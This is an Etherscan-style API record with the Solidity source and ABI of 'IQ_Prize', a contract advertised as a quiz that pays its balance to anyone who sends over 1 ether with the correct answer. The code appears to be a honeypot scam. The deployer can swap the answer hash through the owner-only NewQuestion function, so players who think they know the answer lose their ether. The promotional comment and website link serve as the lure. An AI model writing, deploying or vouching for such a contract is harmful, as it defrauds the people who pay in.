{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nIQ Prize\r\n\r\nThe one who has the intellect will take the prize in our game. Reading books expands the mind\r\n\r\nhttps://www.iqtest-certification.com\r\n\r\n\r\n$$$$$$\\  $$$$$$\\        $$$$$$$\\            $$\\                     \r\n\\_$$  _|$$  __$$\\       $$  __$$\\           \\__|                    \r\n  $$ |  $$ /  $$ |      $$ |  $$ | $$$$$$\\  $$\\ $$$$$$$$\\  $$$$$$\\  \r\n  $$ |  $$ |  $$ |      $$$$$$$  |$$  __$$\\ $$ |\\____$$  |$$  __$$\\ \r\n  $$ |  $$ |  $$ |      $$  ____/ $$ |  \\__|$$ |  $$$$ _/ $$$$$$$$ |\r\n  $$ |  $$ $$\\$$ |      $$ |      $$ |      $$ | $$  _/   $$   ____|\r\n$$$$$$\\ \\$$$$$$ /       $$ |      $$ |      $$ |$$$$$$$$\\ \\$$$$$$$\\ \r\n\\______| \\___$$$\\       \\__|      \\__|      \\__|\\________| \\_______|\r\n             \\___|\r\n*/\r\npragma solidity ^0.4.20;\r\n\r\ncontract IQ_Prize\r\n{\r\n    function Try(string _response) external payable {\r\n        require(msg.sender == tx.origin);\r\n        \r\n        if(responseHash == keccak256(_response) && msg.value>1 ether)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    string public question;\r\n    \r\n    address questionSender;\r\n    \r\n    bytes32 responseHash;\r\n \r\n    function start_qz_game(string _question,string _response) public payable {\r\n        if(responseHash==0x0) \r\n        {\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n            questionSender = msg.sender;\r\n        }\r\n    }\r\n    \r\n /*   function StopGame() public payable onlyQuestionSender {\r\n       selfdestruct(msg.sender);\r\n    }\r\n */   \r\n    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n    \r\n    function newQuestioner(address newAddress) public onlyQuestionSender {\r\n        questionSender = newAddress;\r\n    }\r\n    \r\n    modifier onlyQuestionSender(){\r\n        require(msg.sender==questionSender);\r\n        _;\r\n    }\r\n\r\n    \r\n    function() public payable{}\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"start_qz_game\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"NewQuestion\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"newQuestioner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]", "ContractName": "IQ_Prize", "CompilerVersion": "v0.4.20+commit.3155dd80", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "Library": "", "SwarmSource": "bzzr://873255dbfe1c1518cb6f363ca8563e88181b804f93cf502ac59db8cd01d53901"}]}